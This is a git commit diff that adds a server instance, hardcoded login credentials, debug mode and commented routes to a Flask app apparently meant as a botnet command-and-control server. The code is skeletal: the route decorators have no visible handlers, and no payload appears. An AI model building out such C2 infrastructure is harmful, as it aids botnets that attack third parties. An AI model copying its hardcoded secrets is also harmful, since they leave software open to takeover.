b63788b1d28bb2ff39fddc59dc50f48462800648
Alessio Moretti <alessio.moretti@live.it>
2016-12-28 11:10:40 +0100

    Add CC server instance and update routings.

--- allsafecc/allsafecc.py
+++ allsafecc/allsafecc.py
@@ -1,4 +1,5 @@
 from flask import Flask
+from CCServer import CCServer 
 
 app = Flask(__name__)
 
@@ -10,10 +11,25 @@ by multiple botnet instances, ideally deployed 'round-the-clock'
 (please note that in this implementation the server handles just one request at a time - flask default)
 """
 
+# parameters for CC instance
+settingsPath = "./data/settings.json"
+credentialsD = {
+    'auth_usr' : "fsociety",
+    'auth_pwd' : "steelmountain"
+}
+# creating CC instance
+CC = CCServer(settingsPath, credentialsD)
+
+# debug level
+debug = True
+
+# ROUTING SERVER - settings retrieval 
 @app.route('/settings', methods=['GET'])
 
+# ROUTING SERVER - update settings 
 @app.route('/update', methods=['POST'])
 
+# ROUTING SERVER - logs visualization (debug purposes)
 @app.route('/logs', methods=['GET'])
 
 if __name__ == "__main__": 
